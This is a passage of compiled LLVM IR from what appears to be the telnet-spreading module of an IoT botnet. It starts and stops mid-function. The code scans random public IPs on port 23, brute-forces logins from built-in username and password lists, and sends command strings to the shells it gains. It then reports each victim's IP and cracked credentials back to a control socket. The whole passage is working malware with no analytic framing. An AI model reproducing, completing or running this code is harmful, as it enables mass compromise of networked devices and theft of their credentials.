  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = tail call i32 @getdtablesize() #5
  %7 = sdiv i32 %6, 4
  %8 = mul nsw i32 %7, 3
  %9 = icmp slt i32 %8, 4096
  %10 = select i1 %9, i32 %8, i32 4096
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call zeroext i16 @htons(i16 zeroext 23) #18
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %12, i16* %13, align 2
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %15 = bitcast i8* %14 to i64*
  store i64 0, i64* %15, align 4
  %16 = zext i32 %10 to i64
  %17 = alloca %struct.telstate_t, i64 %16, align 16
  %18 = bitcast %struct.telstate_t* %17 to i8*
  %19 = sext i32 %10 to i64
  %20 = mul nsw i64 %19, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %18, i8 0, i64 %20, i32 16, i1 false)
  %21 = icmp sgt i32 %6, 3
  br i1 %21, label %.lr.ph198.preheader, label %.preheader

.lr.ph198.preheader:                              ; preds = %0
  %22 = sext i32 %10 to i64
  br label %.lr.ph198

.preheader.loopexit:                              ; preds = %.lr.ph198
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %0
  %23 = icmp sgt i32 %6, 3
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 0
  %26 = getelementptr inbounds %struct.timeval, %struct.timeval* %2, i64 0, i32 1
  br label %.loopexit

.lr.ph198:                                        ; preds = %.lr.ph198.preheader, %.lr.ph198
  %indvars.iv = phi i64 [ 0, %.lr.ph198.preheader ], [ %indvars.iv.next, %.lr.ph198 ]
  %27 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %indvars.iv, i32 3
  store i8 1, i8* %27, align 1
  %28 = tail call noalias i8* @malloc(i64 1024) #5
  %29 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %indvars.iv, i32 8
  store i8* %28, i8** %29, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 1024, i32 1, i1 false)
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %30 = icmp slt i64 %indvars.iv.next, %22
  br i1 %30, label %.lr.ph198, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %23, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %2, i64 0, i32 0
  %33 = bitcast i32* %4 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %451
  %.1196 = phi i32 [ %.mux, %451 ], [ 0, %.lr.ph.preheader ]
  %34 = sext i32 %.1196 to i64
  %35 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34
  %36 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 2
  %37 = load i8, i8* %36, align 8
  switch i8 %37, label %451 [
    i8 0, label %38
    i8 1, label %86
    i8 2, label %135
    i8 3, label %165
    i8 4, label %188
    i8 5, label %227
    i8 6, label %250
    i8 7, label %295
    i8 8, label %305
    i8 9, label %315
    i8 10, label %325
    i8 100, label %378
    i8 101, label %388
    i8 102, label %398
    i8 103, label %408
  ]

; <label>:38:                                     ; preds = %.lr.ph
  %39 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %40 = load i8*, i8** %39, align 8
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 1024, i32 1, i1 false)
  %41 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  %42 = load i8, i8* %41, align 1
  %43 = icmp eq i8 %42, 0
  br i1 %43, label %50, label %44

; <label>:44:                                     ; preds = %38
  %45 = bitcast i8** %39 to i64*
  %46 = load i64, i64* %45, align 8
  %47 = bitcast %struct.telstate_t* %35 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 32, i32 16, i1 false)
  store i64 %46, i64* %45, align 8
  %48 = call i32 @getRandomPublicIP()
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 1
  store i32 %48, i32* %49, align 4
  br label %64

; <label>:50:                                     ; preds = %38
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 5
  %52 = load i8, i8* %51, align 1
  %53 = add i8 %52, 1
  store i8 %53, i8* %51, align 1
  %54 = icmp eq i8 %53, 14
  br i1 %54, label %55, label %59

; <label>:55:                                     ; preds = %50
  store i8 0, i8* %51, align 1
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 4
  %57 = load i8, i8* %56, align 2
  %58 = add i8 %57, 1
  store i8 %58, i8* %56, align 2
  br label %59

; <label>:59:                                     ; preds = %55, %50
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 4
  %61 = load i8, i8* %60, align 2
  %62 = icmp eq i8 %61, 7
  br i1 %62, label %63, label %64

; <label>:63:                                     ; preds = %59
  store i8 1, i8* %41, align 1
  br label %451

; <label>:64:                                     ; preds = %59, %44
  store i16 2, i16* %11, align 4
  store i16 %12, i16* %13, align 2
  store i64 0, i64* %15, align 4
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 1
  %66 = load i32, i32* %65, align 4
  store i32 %66, i32* %24, align 4
  %67 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %68 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  store i32 %67, i32* %68, align 16
  %69 = icmp eq i32 %67, -1
  br i1 %69, label %451, label %70

; <label>:70:                                     ; preds = %64
  %71 = call i32 (i32, i32, ...) @fcntl(i32 %67, i32 3, i8* null) #5
  %72 = or i32 %71, 2048
  %73 = call i32 (i32, i32, ...) @fcntl(i32 %67, i32 4, i32 %72) #5
  %74 = load i32, i32* %68, align 16
  %75 = call i32 @connect(i32 %74, %struct.sockaddr* nonnull %31, i32 16) #5
  %76 = icmp eq i32 %75, -1
  br i1 %76, label %77, label %84

; <label>:77:                                     ; preds = %70
  %78 = tail call i32* @__errno_location() #18
  %79 = load i32, i32* %78, align 4
  %80 = icmp eq i32 %79, 115
  br i1 %80, label %84, label %81

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* %68, align 16
  %83 = call i32 @sclose(i32 %82)
  store i8 1, i8* %41, align 1
  br label %451

; <label>:84:                                     ; preds = %77, %70
  store i8 1, i8* %36, align 8
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  store i32 0, i32* %85, align 4
  br label %451

; <label>:86:                                     ; preds = %.lr.ph
  %87 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  %88 = load i32, i32* %87, align 4
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %92

; <label>:90:                                     ; preds = %86
  %91 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  store i32 %91, i32* %87, align 4
  br label %92

; <label>:92:                                     ; preds = %86, %90
  %93 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %25) #5, !srcloc !6
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %95 = load i32, i32* %94, align 16
  %96 = srem i32 %95, 64
  %97 = zext i32 %96 to i64
  %98 = shl i64 1, %97
  %99 = sdiv i32 %95, 64
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 %100
  %102 = load i64, i64* %101, align 8
  %103 = or i64 %98, %102
  store i64 %103, i64* %101, align 8
  store i64 0, i64* %32, align 8
  store i64 10000, i64* %26, align 8
  %104 = load i32, i32* %94, align 16
  %105 = add nsw i32 %104, 1
  %106 = call i32 @select(i32 %105, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %1, %struct.__sigset_t* null, %struct.timeval* nonnull %2) #5
  switch i32 %106, label %126 [
    i32 1, label %107
    i32 -1, label %122
  ]

; <label>:107:                                    ; preds = %92
  store i32 4, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %108 = load i32, i32* %94, align 16
  %109 = call i32 @getsockopt(i32 %108, i32 1, i32 4, i8* nonnull %33, i32* nonnull %3) #5
  %110 = load i32, i32* %4, align 4
  %111 = icmp eq i32 %110, 0
  %112 = load i32, i32* %94, align 16
  br i1 %111, label %115, label %113

; <label>:113:                                    ; preds = %107
  %114 = call i32 @sclose(i32 %112)
  br label %.sink.split

; <label>:115:                                    ; preds = %107
  %116 = call i32 (i32, i32, ...) @fcntl(i32 %112, i32 3, i8* null) #5
  %117 = and i32 %116, -2049
  %118 = call i32 (i32, i32, ...) @fcntl(i32 %112, i32 4, i32 %117) #5
  store i32 0, i32* %87, align 4
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 7
  store i16 0, i16* %119, align 16
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %121 = load i8*, i8** %120, align 8
  call void @llvm.memset.p0i8.i64(i8* %121, i8 0, i64 1024, i32 1, i1 false)
  store i8 2, i8* %36, align 8
  br label %451

; <label>:122:                                    ; preds = %92
  %123 = load i32, i32* %94, align 16
  %124 = call i32 @sclose(i32 %123)
  br label %.sink.split

.sink.split:                                      ; preds = %113, %122
  store i8 0, i8* %36, align 8
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %125, align 1
  br label %126

; <label>:126:                                    ; preds = %92, %.sink.split
  %127 = load i32, i32* %87, align 4
  %128 = add i32 %127, 10
  %129 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %130 = icmp ult i32 %128, %129
  br i1 %130, label %131, label %451

; <label>:131:                                    ; preds = %126
  %132 = load i32, i32* %94, align 16
  %133 = call i32 @sclose(i32 %132)
  store i8 0, i8* %36, align 8
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %134, align 1
  br label %451

; <label>:135:                                    ; preds = %.lr.ph
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  %137 = load i32, i32* %136, align 4
  %138 = icmp eq i32 %137, 0
  br i1 %138, label %139, label %141

; <label>:139:                                    ; preds = %135
  %140 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  store i32 %140, i32* %136, align 4
  br label %141

; <label>:141:                                    ; preds = %139, %135
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %143 = load i32, i32* %142, align 16
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %145 = load i8*, i8** %144, align 8
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 7
  %147 = load i16, i16* %146, align 16
  %148 = zext i16 %147 to i32
  %149 = call i32 @readUntil(i32 %143, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %145, i32 1024, i32 %148)
  %150 = icmp eq i32 %149, 0
  br i1 %150, label %153, label %151

; <label>:151:                                    ; preds = %141
  store i32 0, i32* %136, align 4
  store i16 0, i16* %146, align 16
  %152 = load i8*, i8** %144, align 8
  call void @llvm.memset.p0i8.i64(i8* %152, i8 0, i64 1024, i32 1, i1 false)
  store i8 3, i8* %36, align 8
  br label %451

; <label>:153:                                    ; preds = %141
  %154 = load i8*, i8** %144, align 8
  %155 = call i64 @strlen(i8* %154) #15
  %156 = trunc i64 %155 to i16
  store i16 %156, i16* %146, align 16
  %157 = load i32, i32* %136, align 4
  %158 = add i32 %157, 30
  %159 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %160 = icmp ult i32 %158, %159
  br i1 %160, label %161, label %451

; <label>:161:                                    ; preds = %153
  %162 = load i32, i32* %142, align 16
  %163 = call i32 @sclose(i32 %162)
  store i8 0, i8* %36, align 8
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %164, align 1
  br label %451

; <label>:165:                                    ; preds = %.lr.ph
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %167 = load i32, i32* %166, align 16
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 4
  %169 = load i8, i8* %168, align 2
  %170 = zext i8 %169 to i64
  %171 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %170
  %172 = load i8*, i8** %171, align 8
  %173 = call i64 @strlen(i8* %172) #15
  %174 = call i64 @send(i32 %167, i8* %172, i64 %173, i32 16384) #5
  %175 = icmp slt i64 %174, 0
  %176 = load i32, i32* %166, align 16
  br i1 %175, label %177, label %180

; <label>:177:                                    ; preds = %165
  %178 = call i32 @sclose(i32 %176)
  store i8 0, i8* %36, align 8
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %179, align 1
  br label %451

; <label>:180:                                    ; preds = %165
  %181 = call i64 @send(i32 %176, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.27, i64 0, i64 0), i64 2, i32 16384) #5
  %182 = icmp slt i64 %181, 0
  br i1 %182, label %183, label %187

; <label>:183:                                    ; preds = %180
  %184 = load i32, i32* %166, align 16
  %185 = call i32 @sclose(i32 %184)
  store i8 0, i8* %36, align 8
  %186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %186, align 1
  br label %451

; <label>:187:                                    ; preds = %180
  store i8 4, i8* %36, align 8
  br label %451

; <label>:188:                                    ; preds = %.lr.ph
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  %190 = load i32, i32* %189, align 4
  %191 = icmp eq i32 %190, 0
  br i1 %191, label %192, label %194

; <label>:192:                                    ; preds = %188
  %193 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  store i32 %193, i32* %189, align 4
  br label %194

; <label>:194:                                    ; preds = %192, %188
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %196 = load i32, i32* %195, align 16
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %198 = load i8*, i8** %197, align 8
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 7
  %200 = load i16, i16* %199, align 16
  %201 = zext i16 %200 to i32
  %202 = call i32 @readUntil(i32 %196, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %198, i32 1024, i32 %201)
  %203 = icmp eq i32 %202, 0
  br i1 %203, label %208, label %204

; <label>:204:                                    ; preds = %194
  store i32 0, i32* %189, align 4
  store i16 0, i16* %199, align 16
  %205 = load i8*, i8** %197, align 8
  %206 = call i8* @strstr(i8* %205, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i64 0, i64 0)) #15
  %207 = icmp ne i8* %206, null
  %.sink = select i1 %207, i8 5, i8 100
  store i8 %.sink, i8* %36, align 8
  call void @llvm.memset.p0i8.i64(i8* %205, i8 0, i64 1024, i32 1, i1 false)
  br label %451

; <label>:208:                                    ; preds = %194
  %209 = load i8*, i8** %197, align 8
  %210 = call i8* @strstr(i8* %209, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i64 0, i64 0)) #15
  %211 = icmp eq i8* %210, null
  br i1 %211, label %216, label %212

; <label>:212:                                    ; preds = %208
  %213 = load i32, i32* %195, align 16
  %214 = call i32 @sclose(i32 %213)
  store i8 0, i8* %36, align 8
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %215, align 1
  br label %451

; <label>:216:                                    ; preds = %208
  %217 = call i64 @strlen(i8* %209) #15
  %218 = trunc i64 %217 to i16
  store i16 %218, i16* %199, align 16
  %219 = load i32, i32* %189, align 4
  %220 = add i32 %219, 30
  %221 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %222 = icmp ult i32 %220, %221
  br i1 %222, label %223, label %451

; <label>:223:                                    ; preds = %216
  %224 = load i32, i32* %195, align 16
  %225 = call i32 @sclose(i32 %224)
  store i8 0, i8* %36, align 8
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %226, align 1
  br label %451

; <label>:227:                                    ; preds = %.lr.ph
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %229 = load i32, i32* %228, align 16
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 5
  %231 = load i8, i8* %230, align 1
  %232 = zext i8 %231 to i64
  %233 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %232
  %234 = load i8*, i8** %233, align 8
  %235 = call i64 @strlen(i8* %234) #15
  %236 = call i64 @send(i32 %229, i8* %234, i64 %235, i32 16384) #5
  %237 = icmp slt i64 %236, 0
  %238 = load i32, i32* %228, align 16
  br i1 %237, label %239, label %242

; <label>:239:                                    ; preds = %227
  %240 = call i32 @sclose(i32 %238)
  store i8 0, i8* %36, align 8
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %241, align 1
  br label %451

; <label>:242:                                    ; preds = %227
  %243 = call i64 @send(i32 %238, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.27, i64 0, i64 0), i64 2, i32 16384) #5
  %244 = icmp slt i64 %243, 0
  br i1 %244, label %245, label %249

; <label>:245:                                    ; preds = %242
  %246 = load i32, i32* %228, align 16
  %247 = call i32 @sclose(i32 %246)
  store i8 0, i8* %36, align 8
  %248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %248, align 1
  br label %451

; <label>:249:                                    ; preds = %242
  store i8 6, i8* %36, align 8
  br label %451

; <label>:250:                                    ; preds = %.lr.ph
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  %252 = load i32, i32* %251, align 4
  %253 = icmp eq i32 %252, 0
  br i1 %253, label %254, label %256

; <label>:254:                                    ; preds = %250
  %255 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  store i32 %255, i32* %251, align 4
  br label %256

; <label>:256:                                    ; preds = %254, %250
  %257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %258 = load i32, i32* %257, align 16
  %259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %260 = load i8*, i8** %259, align 8
  %261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 7
  %262 = load i16, i16* %261, align 16
  %263 = zext i16 %262 to i32
  %264 = call i32 @readUntil(i32 %258, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %260, i32 1024, i32 %263)
  %265 = icmp eq i32 %264, 0
  br i1 %265, label %283, label %266

; <label>:266:                                    ; preds = %256
  store i32 0, i32* %251, align 4
  store i16 0, i16* %261, align 16
  %267 = load i8*, i8** %259, align 8
  %268 = call i8* @strstr(i8* %267, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i64 0, i64 0)) #15
  %269 = icmp eq i8* %268, null
  br i1 %269, label %274, label %270

; <label>:270:                                    ; preds = %266
  call void @llvm.memset.p0i8.i64(i8* %267, i8 0, i64 1024, i32 1, i1 false)
  %271 = load i32, i32* %257, align 16
  %272 = call i32 @sclose(i32 %271)
  store i8 0, i8* %36, align 8
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %273, align 1
  br label %451

; <label>:274:                                    ; preds = %266
  %275 = call i32 @matchPrompt(i8* %267)
  %276 = icmp eq i32 %275, 0
  br i1 %276, label %277, label %281

; <label>:277:                                    ; preds = %274
  call void @llvm.memset.p0i8.i64(i8* %267, i8 0, i64 1024, i32 1, i1 false)
  %278 = load i32, i32* %257, align 16
  %279 = call i32 @sclose(i32 %278)
  store i8 0, i8* %36, align 8
  %280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %280, align 1
  br label %451

; <label>:281:                                    ; preds = %274
  store i8 7, i8* %36, align 8
  %282 = load i8*, i8** %259, align 8
  call void @llvm.memset.p0i8.i64(i8* %282, i8 0, i64 1024, i32 1, i1 false)
  br label %451

; <label>:283:                                    ; preds = %256
  %284 = load i8*, i8** %259, align 8
  %285 = call i64 @strlen(i8* %284) #15
  %286 = trunc i64 %285 to i16
  store i16 %286, i16* %261, align 16
  %287 = load i32, i32* %251, align 4
  %288 = add i32 %287, 30
  %289 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %290 = icmp ult i32 %288, %289
  br i1 %290, label %291, label %451

; <label>:291:                                    ; preds = %283
  %292 = load i32, i32* %257, align 16
  %293 = call i32 @sclose(i32 %292)
  store i8 0, i8* %36, align 8
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %294, align 1
  br label %451

; <label>:295:                                    ; preds = %.lr.ph
  %296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %297 = load i32, i32* %296, align 16
  %298 = call i64 @send(i32 %297, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i64 4, i32 16384) #5
  %299 = icmp slt i64 %298, 0
  br i1 %299, label %300, label %304

; <label>:300:                                    ; preds = %295
  %301 = load i32, i32* %296, align 16
  %302 = call i32 @sclose(i32 %301)
  store i8 0, i8* %36, align 8
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %303, align 1
  br label %451

; <label>:304:                                    ; preds = %295
  store i8 8, i8* %36, align 8
  br label %451

; <label>:305:                                    ; preds = %.lr.ph
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %307 = load i32, i32* %306, align 16
  %308 = call i64 @send(i32 %307, i8* getelementptr inbounds ([266 x i8], [266 x i8]* @.str.31, i64 0, i64 0), i64 85, i32 16384) #5
  %309 = icmp slt i64 %308, 0
  br i1 %309, label %310, label %314

; <label>:310:                                    ; preds = %305
  %311 = load i32, i32* %306, align 16
  %312 = call i32 @sclose(i32 %311)
  store i8 0, i8* %36, align 8
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %313, align 1
  br label %451

; <label>:314:                                    ; preds = %305
  store i8 9, i8* %36, align 8
  br label %451

; <label>:315:                                    ; preds = %.lr.ph
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %317 = load i32, i32* %316, align 16
  %318 = call i64 @send(i32 %317, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.32, i64 0, i64 0), i64 49, i32 16384) #5
  %319 = icmp slt i64 %318, 0
  br i1 %319, label %320, label %324

; <label>:320:                                    ; preds = %315
  %321 = load i32, i32* %316, align 16
  %322 = call i32 @sclose(i32 %321)
  store i8 0, i8* %36, align 8
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %323, align 1
  br label %451

; <label>:324:                                    ; preds = %315
  store i8 10, i8* %36, align 8
  br label %451

; <label>:325:                                    ; preds = %.lr.ph
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  %327 = load i32, i32* %326, align 4
  %328 = icmp eq i32 %327, 0
  br i1 %328, label %329, label %331

; <label>:329:                                    ; preds = %325
  %330 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  store i32 %330, i32* %326, align 4
  br label %331

; <label>:331:                                    ; preds = %329, %325
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %333 = load i32, i32* %332, align 16
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %335 = load i8*, i8** %334, align 8
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 7
  %337 = load i16, i16* %336, align 16
  %338 = zext i16 %337 to i32
  %339 = call i32 @readUntil(i32 %333, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.33, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %335, i32 1024, i32 %338)
  %340 = icmp eq i32 %339, 0
  br i1 %340, label %366, label %341

; <label>:341:                                    ; preds = %331
  store i32 0, i32* %326, align 4
  store i16 0, i16* %336, align 16
  %342 = load i8*, i8** %334, align 8
  %343 = call i8* @strstr(i8* %342, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.34, i64 0, i64 0)) #15
  %344 = icmp eq i8* %343, null
  br i1 %344, label %361, label %345

; <label>:345:                                    ; preds = %341
  %346 = load i32, i32* @mainCommSock, align 4
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 1
  %348 = load i32, i32* %347, align 4
  %349 = call i8* @inet_ntoa(i32 %348) #5
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 4
  %351 = load i8, i8* %350, align 2
  %352 = zext i8 %351 to i64
  %353 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %352
  %354 = load i8*, i8** %353, align 8
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 5
  %356 = load i8, i8* %355, align 1
  %357 = zext i8 %356 to i64
  %358 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %357
  %359 = load i8*, i8** %358, align 8
  %360 = call i32 (i32, i8*, ...) @sockprintf(i32 %346, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.35, i64 0, i64 0), i8* %349, i8* %354, i8* %359)
  br label %361

; <label>:361:                                    ; preds = %341, %345
  %362 = load i8*, i8** %334, align 8
  call void @llvm.memset.p0i8.i64(i8* %362, i8 0, i64 1024, i32 1, i1 false)
  %363 = load i32, i32* %332, align 16
  %364 = call i32 @sclose(i32 %363)
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %365, align 1
  store i8 0, i8* %36, align 8
  br label %451

; <label>:366:                                    ; preds = %331
  %367 = load i8*, i8** %334, align 8
  %368 = call i64 @strlen(i8* %367) #15
  %369 = trunc i64 %368 to i16
  store i16 %369, i16* %336, align 16
  %370 = load i32, i32* %326, align 4
  %371 = add i32 %370, 30
  %372 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %373 = icmp ult i32 %371, %372
  br i1 %373, label %374, label %451

; <label>:374:                                    ; preds = %366
  %375 = load i32, i32* %332, align 16
  %376 = call i32 @sclose(i32 %375)
  store i8 0, i8* %36, align 8
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %377, align 1
  br label %451

; <label>:378:                                    ; preds = %.lr.ph
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %380 = load i32, i32* %379, align 16
  %381 = call i64 @send(i32 %380, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i64 4, i32 16384) #5
  %382 = icmp slt i64 %381, 0
  br i1 %382, label %383, label %387

; <label>:383:                                    ; preds = %378
  %384 = load i32, i32* %379, align 16
  %385 = call i32 @sclose(i32 %384)
  store i8 0, i8* %36, align 8
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %386, align 1
  br label %451

; <label>:387:                                    ; preds = %378
  store i8 101, i8* %36, align 8
  br label %451

; <label>:388:                                    ; preds = %.lr.ph
  %389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %390 = load i32, i32* %389, align 16
  %391 = call i64 @send(i32 %390, i8* getelementptr inbounds ([266 x i8], [266 x i8]* @.str.31, i64 0, i64 0), i64 282, i32 16384) #5
  %392 = icmp slt i64 %391, 0
  br i1 %392, label %393, label %397

